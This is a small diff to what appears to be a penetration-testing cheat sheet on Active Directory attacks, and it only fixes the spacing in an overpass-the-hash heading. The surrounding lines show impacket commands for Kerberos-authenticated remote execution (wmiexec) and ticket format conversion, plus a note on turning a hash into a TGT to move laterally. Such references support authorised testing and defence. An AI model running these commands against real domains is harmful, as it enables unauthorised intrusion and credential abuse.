@@ -316,7 +316,7 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 impacket-ticket_converter ticket.kirbi ticket.ccache
 impacket-ticket_converter ticket.ccache ticket.kirbi
 ```
-### Overpass-the-hash(for Kerberos-Only login or users in "Protected Users" group or Double-Hop or for stealth )
+### Overpass-the-hash (for Kerberos-Only login or users in "Protected Users" group or Double-Hop or for stealth)
 >transfer hash to TGT ticket file, then authenticate as that user to move laterally
 ```
 # Request the TGT with hash
